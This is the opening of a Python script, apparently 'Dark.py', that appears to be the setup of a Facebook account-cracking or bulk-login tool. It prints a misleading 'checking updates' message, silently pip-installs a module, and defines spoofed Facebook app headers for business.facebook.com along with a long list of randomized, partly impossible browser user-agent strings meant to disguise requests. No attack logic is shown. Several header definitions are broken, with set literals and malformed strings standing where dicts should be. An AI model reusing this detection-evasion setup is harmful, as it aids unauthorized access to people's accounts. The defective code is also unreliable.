import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

def clear():
    os.system('clear')

print('sus')
print('\033[1;37m[+] \033[1;32m[+]CHECKING UPDATES...')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')

except:pass
header_grup = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head = {'User Agent : "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.1; WOW64; en-US Trident/4.0) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
head = {"user-agent": "Mozilla/5.0 (Linux; U; Linux i665 x86_64; en-US) Gecko/20100101 Firefox/64.2 [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup = {"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_9; like Mac OS X) AppleWebKit/535.39 (KHTML, like Gecko)  Chrome/53.0.1632.145 Mobile Safari/601.4 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.0;; en-US Trident/4.0) [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
api = {"user-agent": "Mozilla/5.0 (Linux; U; Android 4.4; SAMSUNG SM-G900T Build/KOT49H) AppleWebKit/536.15 (KHTML, like Gecko)  Chrome/55.0.1176.178 Mobile Safari/602.7","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
user_agent=['Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_5_1; en-US) Gecko/20100101 Firefox/46.9','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_8_1) Gecko/20100101 Firefox/45.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1; en-US) AppleWebKit/600.22 (KHTML, like Gecko) Chrome/55.0.3987.251 Safari/602','Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) Gecko/20130401 Firefox/63.2','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_6; like Mac OS X) AppleWebKit/600.3 (KHTML, like Gecko)  Chrome/54.0.3121.100 Mobile Safari/535.8','Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/48.0.1884.288 Safari/536','Mozilla/5.0 (Linux; U; Android 5.0; LG-D330 Build/LRX22G) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/55.0.3244.265 Mobile Safari/601.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_2_3) AppleWebKit/600.32 (KHTML, like Gecko) Chrome/48.0.1153.234 Safari/602','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/603.14 (KHTML, like Gecko) Chrome/53.0.1856.102 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_9; like Mac OS X) AppleWebKit/535.43 (KHTML, like Gecko)  Chrome/49.0.3867.293 Mobile Safari/533.1','Mozilla/5.0 (Windows; U; Windows NT 10.2; WOW64; en-US) AppleWebKit/600.30 (KHTML, like Gecko) Chrome/54.0.3487.146 Safari/600.2 Edge/13.41844','Mozilla/5.0 (Windows NT 10.4; Win64; x64) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/47.0.3552.196 Safari/602.6 Edge/16.15296','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) Gecko/20100101 Firefox/73.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0_1) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/53.0.3122.194 Safari/603','Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64) AppleWebKit/601.17 (KHTML, like Gecko) Chrome/55.0.1896.305 Safari/602','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_6; like Mac OS X) AppleWebKit/536.10 (KHTML, like Gecko)  Chrome/49.0.3828.168 Mobile Safari/600.2','Mozilla/5.0 (Windows; U; Windows NT 6.1; x64) Gecko/20100101 Firefox/65.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_1_4) Gecko/20100101 Firefox/52.9','Mozilla/5.0 (iPod; CPU iPod OS 9_6_5; like Mac OS X) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/52.0.2945.338 Mobile Safari/600.7','Mozilla/5.0 (Android; Android 5.0.1; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/49.0.3875.386 Mobile Safari/533.3','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_6; like Mac OS X) AppleWebKit/601.11 (KHTML, like Gecko)  Chrome/55.0.1603.190 Mobile Safari/602.8','Mozilla/5.0 (Windows; U; Windows NT 6.0;; en-US) AppleWebKit/601.26 (KHTML, like Gecko) Chrome/49.0.3743.113 Safari/601','Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/51.0.2873.171 Safari/601.7 Edge/9.64905','Mozilla/5.0 (Linux i664 ) Gecko/20100101 Firefox/73.3','Mozilla/5.0 (Windows; U; Windows NT 10.2; x64; en-US) Gecko/20100101 Firefox/65.8','Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64; en-US) AppleWebKit/602.45 (KHTML, like Gecko) Chrome/48.0.3081.144 Safari/536','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/52.0.1891.342 Safari/600','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_5_7; en-US) AppleWebKit/537.38 (KHTML, like Gecko) Chrome/50.0.3389.204 Safari/537','Mozilla/5.0 (iPad; CPU iPad OS 8_0_6 like Mac OS X) AppleWebKit/533.46 (KHTML, like Gecko)  Chrome/49.0.2407.194 Mobile Safari/537.4','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 10.1;; en-US Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1; like Mac OS X) AppleWebKit/535.37 (KHTML, like Gecko)  Chrome/51.0.3118.287 Mobile Safari/536.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_9) AppleWebKit/601.48 (KHTML, like Gecko) Chrome/49.0.2834.207 Safari/602','Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_0; like Mac OS X) AppleWebKit/601.50 (KHTML, like Gecko)  Chrome/50.0.1452.335 Mobile Safari/535.5','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.2; x64; en-US Trident/4.0)','Mozilla/5.0 (Linux; Linux i673 ; en-US) AppleWebKit/535.15 (KHTML, like Gecko) Chrome/55.0.1554.113 Safari/601','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_9; like Mac OS X) AppleWebKit/536.31 (KHTML, like Gecko)  Chrome/48.0.1439.331 Mobile Safari/602.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_8; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/52.0.1529.103 Safari/602','Mozilla/5.0 (Linux; U; Android 5.0; HTC Butterfly S 901 Build/LRX22G) AppleWebKit/535.40 (KHTML, like Gecko)  Chrome/53.0.2430.174 Mobile Safari/534.2','Mozilla/5.0 (U; Linux i545 ) Gecko/20100101 Firefox/49.2','Mozilla/5.0 (Android; Android 6.0.1; HTC One_M8 Pro Build/MRA58K) AppleWebKit/602.2 (KHTML, like Gecko)  Chrome/50.0.2371.388 Mobile Safari/533.6','Mozilla/5.0 (Windows NT 10.4; x64; en-US) AppleWebKit/535.46 (KHTML, like Gecko) Chrome/53.0.3607.179 Safari/536.3 Edge/18.16810','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_6_4) AppleWebKit/534.37 (KHTML, like Gecko) Chrome/53.0.3569.101 Safari/533','Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) AppleWebKit/600.12 (KHTML, like Gecko) Chrome/51.0.2586.385 Safari/601','Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US) Gecko/20130401 Firefox/60.8','Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.0; Win64; x64 Trident/6.0)','Mozilla/5.0 (Windows NT 10.2; WOW64) Gecko/20100101 Firefox/45.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_6_9; en-US) AppleWebKit/536.49 (KHTML, like Gecko) Chrome/52.0.3687.277 Safari/533','Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/74.0','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20130401 Firefox/66.0','Mozilla/5.0 (Windows NT 10.1;) AppleWebKit/536.31 (KHTML, like Gecko) Chrome/54.0.2982.195 Safari/600.4 Edge/16.73947','Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_1; like Mac OS X) AppleWebKit/533.34 (KHTML, like Gecko)  Chrome/55.0.2364.297 Mobile Safari/603.1','Mozilla/5.0 (Linux; U; Linux i576 x86_64; en-US) AppleWebKit/533.31 (KHTML, like Gecko) Chrome/49.0.2381.297 Safari/603','Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64) AppleWebKit/603.1 (KHTML, like Gecko) Chrome/48.0.1099.249 Safari/534.0 Edge/9.18790','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_7; like Mac OS X) AppleWebKit/534.37 (KHTML, like Gecko)  Chrome/52.0.2004.289 Mobile Safari/535.5','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 10.1; WOW64 Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6; en-US) AppleWebKit/537.38 (KHTML, like Gecko) Chrome/55.0.2052.330 Safari/537','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.3; x64 Trident/4.0)','Mozilla/5.0 (Linux; Android 5.0.2; LG-D705 Build/LRX22G) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/50.0.2677.154 Mobile Safari/602.9','Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64) AppleWebKit/602.48 (KHTML, like Gecko) Chrome/49.0.2294.299 Safari/603.0 Edge/10.61233','Mozilla/5.0 (Windows; Windows NT 10.4; WOW64; en-US) AppleWebKit/603.33 (KHTML, like Gecko) Chrome/54.0.3650.237 Safari/602','Mozilla/5.0 (Windows; U; Windows NT 6.3;; en-US) AppleWebKit/600.40 (KHTML, like Gecko) Chrome/52.0.1899.105 Safari/601','Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) Gecko/20130401 Firefox/54.1','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.0; WOW64; en-US Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_6; like Mac OS X) AppleWebKit/535.2 (KHTML, like Gecko)  Chrome/49.0.2453.347 Mobile Safari/602.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_3_9) Gecko/20100101 Firefox/71.3','Mozilla/5.0 (Linux x86_64) AppleWebKit/536.16 (KHTML, like Gecko) Chrome/51.0.3383.141 Safari/602','Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/601.29 (KHTML, like Gecko) Chrome/51.0.3890.394 Safari/603.1 Edge/16.71283','Mozilla/5.0 (Linux; U; Android 5.0.1; LG-D729 Build/LRX22G) AppleWebKit/536.42 (KHTML, like Gecko)  Chrome/49.0.3733.382 Mobile Safari/535.4','Mozilla/5.0 (Linux; Linux i643 x86_64) AppleWebKit/534.40 (KHTML, like Gecko) Chrome/51.0.3440.115 Safari/600','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; x64; en-US Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0_1; en-US) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/53.0.1675.291 Safari/602','Mozilla/5.0 (Windows; Windows NT 10.1; x64; en-US) AppleWebKit/602.26 (KHTML, like Gecko) Chrome/47.0.1435.386 Safari/600.2 Edge/17.84640','Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) Gecko/20130401 Firefox/58.2','Mozilla/5.0 (Windows; U; Windows NT 6.2;) Gecko/20100101 Firefox/63.6','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_2; like Mac OS X) AppleWebKit/536.41 (KHTML, like Gecko)  Chrome/47.0.1750.168 Mobile Safari/536.4','Mozilla/5.0 (Linux; Android 4.4.4; Nokia 3410 Build/IMM76D) AppleWebKit/602.34 (KHTML, like Gecko)  Chrome/53.0.3969.267 Mobile Safari/600.7','Mozilla/5.0 (Windows NT 10.1;) AppleWebKit/602.19 (KHTML, like Gecko) Chrome/49.0.2035.218 Safari/602.8 Edge/18.42735','Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64) Gecko/20100101 Firefox/65.2','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_0; like Mac OS X) AppleWebKit/603.32 (KHTML, like Gecko)  Chrome/53.0.1060.329 Mobile Safari/601.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_8; like Mac OS X) AppleWebKit/600.22 (KHTML, like Gecko)  Chrome/48.0.3185.366 Mobile Safari/534.8','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.2; WOW64 Trident/7.0)','Mozilla/5.0 (iPad; CPU iPad OS 9_7_0 like Mac OS X) AppleWebKit/536.28 (KHTML, like Gecko)  Chrome/48.0.1618.278 Mobile Safari/601.4','Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One0P6B Build/MRA58K) AppleWebKit/536.11 (KHTML, like Gecko)  Chrome/51.0.2275.327 Mobile Safari/603.3','Mozilla/5.0 (Windows NT 6.3; x64; en-US) Gecko/20100101 Firefox/48.9','Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/66.9','Mozilla/5.0 (Linux; U; Linux i666 x86_64) Gecko/20100101 Firefox/46.8','Mozilla/5.0 (Android; Android 4.3.1; HP 655 Notebook PC Build/JSS15J) AppleWebKit/603.1 (KHTML, like Gecko)  Chrome/51.0.1637.362 Mobile Safari/537.8','Mozilla/5.0 (Linux; Android 4.4.4; Nexus 6 Build/KOT49H) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/53.0.3728.396 Mobile Safari/534.8','Mozilla/5.0 (iPod; CPU iPod OS 9_1_4; like Mac OS X) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/47.0.3389.239 Mobile Safari/536.8','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/600.40 (KHTML, like Gecko) Chrome/50.0.3349.263 Safari/533','Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/603.1 (KHTML, like Gecko) Chrome/50.0.1927.157 Safari/534','Mozilla/5.0 (Linux; Android 5.0; SM-G920T Build/KOT49H) AppleWebKit/537.16 (KHTML, like Gecko)  Chrome/48.0.1898.151 Mobile Safari/533.5','Mozilla/5.0 (U; Linux i686 x86_64) AppleWebKit/602.1 (KHTML, like Gecko) Chrome/55.0.2908.221 Safari/533','Mozilla/5.0 (Linux i541 ) Gecko/20130401 Firefox/69.0','Mozilla/5.0 (iPad; CPU iPad OS 8_9_2 like Mac OS X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/47.0.1847.271 Mobile Safari/537.8','Mozilla/5.0 (U; Linux i543 x86_64; en-US) AppleWebKit/535.29 (KHTML, like Gecko) Chrome/52.0.1067.135 Safari/601','Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.1;; en-US Trident/5.0)','Mozilla/5.0 (Linux; Android 5.1.1; SM-G9350T Build/MMB29M) AppleWebKit/600.42 (KHTML, like Gecko)  Chrome/51.0.1417.353 Mobile Safari/601.8','Mozilla/5.0 (Linux; Linux i641 x86_64) AppleWebKit/600.3 (KHTML, like Gecko) Chrome/52.0.1266.398 Safari/535','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.1; x64; en-US Trident/7.0)','Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/51.0.2291.297 Safari/601.4 Edge/15.44351','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.0; x64 Trident/4.0)','Mozilla/5.0 (Linux x86_64) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/54.0.3629.148 Safari/602','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.0; x64 Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_5; like Mac OS X) AppleWebKit/601.32 (KHTML, like Gecko)  Chrome/54.0.1826.291 Mobile Safari/603.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_4; en-US) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/48.0.1152.367 Safari/537','Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.3; WOW64 Trident/5.0)','Mozilla/5.0 (iPad; CPU iPad OS 10_5_1 like Mac OS X) AppleWebKit/536.17 (KHTML, like Gecko)  Chrome/55.0.3043.347 Mobile Safari/537.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_0; like Mac OS X) AppleWebKit/535.32 (KHTML, like Gecko)  Chrome/54.0.3937.304 Mobile Safari/535.9','Mozilla/5.0 (Android; Android 5.1; MOTO G XT1068 Build/LXB22) AppleWebKit/601.49 (KHTML, like Gecko)  Chrome/51.0.3712.228 Mobile Safari/536.5','Mozilla/5.0 (U; Linux x86_64; en-US) Gecko/20130401 Firefox/50.8','Mozilla/5.0 (Linux i546 ; en-US) AppleWebKit/535.38 (KHTML, like Gecko) Chrome/54.0.3863.226 Safari/600','Mozilla/5.0 (Windows NT 10.2; x64; en-US) AppleWebKit/601.49 (KHTML, like Gecko) Chrome/49.0.1664.206 Safari/601.8 Edge/8.82642','Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/533.45 (KHTML, like Gecko) Chrome/54.0.2547.330 Safari/533.4 Edge/9.84460','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_6; en-US) Gecko/20130401 Firefox/63.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_8_5) AppleWebKit/533.48 (KHTML, like Gecko) Chrome/50.0.2932.125 Safari/534','Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_5; like Mac OS X) AppleWebKit/602.2 (KHTML, like Gecko)  Chrome/47.0.2808.212 Mobile Safari/535.5','Mozilla/5.0 (iPod; CPU iPod OS 11_0_0; like Mac OS X) AppleWebKit/535.13 (KHTML, like Gecko)  Chrome/49.0.3831.323 Mobile Safari/535.4','Mozilla/5.0 (Windows; Windows NT 6.2; x64) Gecko/20130401 Firefox/46.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1_1) Gecko/20100101 Firefox/74.5','Mozilla/5.0 (Windows NT 10.4; Win64; x64; en-US) AppleWebKit/535.32 (KHTML, like Gecko) Chrome/48.0.1840.100 Safari/533.5 Edge/10.93181','Mozilla/5.0 (U; Linux i640 ) AppleWebKit/535.5 (KHTML, like Gecko) Chrome/51.0.2738.166 Safari/534','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.0; WOW64; en-US Trident/4.0)','Mozilla/5.0 (U; Linux i685 x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/50.0.1750.221 Safari/537','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3; x64; en-US Trident/4.0)','Mozilla/5.0 (Linux; Android 7.1.1; LG-H900 Build/NRD90C) AppleWebKit/536.11 (KHTML, like Gecko)  Chrome/50.0.1790.231 Mobile Safari/533.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_3_2) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/51.0.1985.387 Safari/602','Mozilla/5.0 (Linux; Android 7.1; Xperia Build/NDE63X) AppleWebKit/602.24 (KHTML, like Gecko)  Chrome/53.0.3020.370 Mobile Safari/534.5','Mozilla/5.0 (Windows NT 10.4; x64) AppleWebKit/536.20 (KHTML, like Gecko) Chrome/48.0.3902.243 Safari/600','Mozilla/5.0 (Windows NT 10.1;; en-US) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/54.0.2646.107 Safari/534.0 Edge/18.82042','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_4; like Mac OS X) AppleWebKit/534.14 (KHTML, like Gecko)  Chrome/48.0.3674.178 Mobile Safari/603.2','Mozilla/5.0 (Windows NT 6.2; Win64; x64) Gecko/20100101 Firefox/52.8','Mozilla/5.0 (Linux; Linux i643 x86_64) AppleWebKit/600.29 (KHTML, like Gecko) Chrome/53.0.1931.363 Safari/601','Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) AppleWebKit/536.49 (KHTML, like Gecko) Chrome/55.0.3026.225 Safari/600.7 Edge/18.20763','Mozilla/5.0 (Linux x86_64) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/49.0.1963.251 Safari/534','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_3_4; en-US) Gecko/20100101 Firefox/67.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_1_3; en-US) AppleWebKit/534.33 (KHTML, like Gecko) Chrome/47.0.3830.132 Safari/533','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_6; like Mac OS X) AppleWebKit/536.48 (KHTML, like Gecko)  Chrome/55.0.2087.291 Mobile Safari/600.9','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1; x64; en-US Trident/7.0)','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_8; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/53.0.2014.298 Safari/536','Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64; en-US) AppleWebKit/537.34 (KHTML, like Gecko) Chrome/53.0.1570.185 Safari/601.5 Edge/10.22339','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_6; like Mac OS X) AppleWebKit/600.12 (KHTML, like Gecko)  Chrome/49.0.2277.370 Mobile Safari/537.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_9) Gecko/20100101 Firefox/56.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_8; like Mac OS X) AppleWebKit/537.47 (KHTML, like Gecko)  Chrome/52.0.3165.125 Mobile Safari/535.1','Mozilla/5.0 (Windows; U; Windows NT 10.2;; en-US) AppleWebKit/533.41 (KHTML, like Gecko) Chrome/54.0.1299.116 Safari/601.2 Edge/9.17525','Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_5; like Mac OS X) AppleWebKit/602.35 (KHTML, like Gecko)  Chrome/52.0.2919.331 Mobile Safari/533.4','Mozilla/5.0 (Linux; Android 6.0.1; HTC One_M8 dual sim Build/MRA58K) AppleWebKit/535.33 (KHTML, like Gecko)  Chrome/47.0.3985.285 Mobile Safari/601.3','Mozilla/5.0 (Windows; U; Windows NT 6.1;) Gecko/20100101 Firefox/66.9','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_5; like Mac OS X) AppleWebKit/533.8 (KHTML, like Gecko)  Chrome/51.0.2692.250 Mobile Safari/534.5','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_0; like Mac OS X) AppleWebKit/600.3 (KHTML, like Gecko)  Chrome/52.0.1179.214 Mobile Safari/602.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7; en-US) AppleWebKit/601.49 (KHTML, like Gecko) Chrome/51.0.2049.391 Safari/603','Mozilla/5.0 (iPod; CPU iPod OS 9_4_1; like Mac OS X) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/51.0.1860.190 Mobile Safari/533.9','Mozilla/5.0 (iPad; CPU iPad OS 8_7_6 like Mac OS X) AppleWebKit/537.49 (KHTML, like Gecko)  Chrome/54.0.3771.347 Mobile Safari/600.2','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.2; Win64; x64 Trident/4.0)','Mozilla/5.0 (Android; Android 7.0; Pixel C Build/NRD90M) AppleWebKit/600.42 (KHTML, like Gecko)  Chrome/51.0.3371.153 Mobile Safari/534.5','Mozilla/5.0 (Windows; Windows NT 10.4;) AppleWebKit/537.39 (KHTML, like Gecko) Chrome/47.0.2852.224 Safari/533.9 Edge/11.43792','Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.2; WOW64 Trident/6.0)','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64 Trident/4.0)','Mozilla/5.0 (Linux; U; Android 4.3.1; Ascend G320 Build/JLS36I) AppleWebKit/535.13 (KHTML, like Gecko)  Chrome/48.0.3806.106 Mobile Safari/535.5','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_7_7) AppleWebKit/601.31 (KHTML, like Gecko) Chrome/47.0.1130.237 Safari/537','Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/533.20 (KHTML, like Gecko) Chrome/53.0.1417.205 Safari/602.0 Edge/14.17833','Mozilla/5.0 (Linux i665 x86_64; en-US) Gecko/20100101 Firefox/63.6','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_8_8; en-US) Gecko/20100101 Firefox/72.4','Mozilla/5.0 (Android; Android 4.4.4; Lenovo P774 Build/Lenovo) AppleWebKit/600.6 (KHTML, like Gecko)  Chrome/48.0.1758.238 Mobile Safari/603.4','Mozilla/5.0 (iPhone; CPU iPhone OS 7_5_1; like Mac OS X) AppleWebKit/535.4 (KHTML, like Gecko)  Chrome/55.0.2880.291 Mobile Safari/535.5','Mozilla/5.0 (Linux; Android 5.0.1; LG-D724 Build/LRX22G) AppleWebKit/537.49 (KHTML, like Gecko)  Chrome/55.0.2773.215 Mobile Safari/602.7','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_0; like Mac OS X) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/49.0.1394.156 Mobile Safari/603.3','Mozilla/5.0 (iPhone; CPU iPhone OS 10_6_4; like Mac OS X) AppleWebKit/535.25 (KHTML, like Gecko)  Chrome/47.0.2752.110 Mobile Safari/601.3','Mozilla/5.0 (Android; Android 4.4; Nexus_S_4G Build/GRJ22) AppleWebKit/602.24 (KHTML, like Gecko)  Chrome/49.0.1402.363 Mobile Safari/535.3','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.2; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (Android; Android 6.0.1; Nexus 6 Build/MMB29K) AppleWebKit/534.45 (KHTML, like Gecko)  Chrome/48.0.3617.262 Mobile Safari/535.9','Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_5; like Mac OS X) AppleWebKit/536.2 (KHTML, like Gecko)  Chrome/54.0.2630.109 Mobile Safari/533.0']
uas_bawaan = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_7; like Mac OS X) AppleWebKit/602.15 (KHTML, like Gecko)  Chrome/51.0.3166.366 Mobile Safari/601.8 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_9; like Mac OS X) AppleWebKit/600.43 (KHTML, like Gecko)  Chrome/51.0.1523.109 Mobile Safari/534.1"
uas_nokiax20 = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2; like Mac OS X) AppleWebKit/603.48 (KHTML, like Gecko)  Chrome/51.0.2795.302 Mobile Safari/534.2"
uas_nokiax = "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_6; like Mac OS X) AppleWebKit/536.20 (KHTML, like Gecko)  Chrome/47.0.3187.165 Mobile Safari/533.4"
uas_samsungse = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_3; like Mac OS X) AppleWebKit/603.5 (KHTML, like Gecko)  Chrome/47.0.3841.131 Mobile Safari/602.3"
uas_redmi9a = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_4; like Mac OS X) AppleWebKit/601.26 (KHTML, like Gecko)  Chrome/49.0.3456.337 Mobile Safari/533.8"
uas_nokiaxl = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_7; like Mac OS X) AppleWebKit/601.31 (KHTML, like Gecko)  Chrome/48.0.3017.400 Mobile Safari/534.6"
uas_chromelinux = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_0; like Mac OS X) AppleWebKit/533.6 (KHTML, like Gecko)  Chrome/54.0.1168.386 Mobile Safari/537.5"
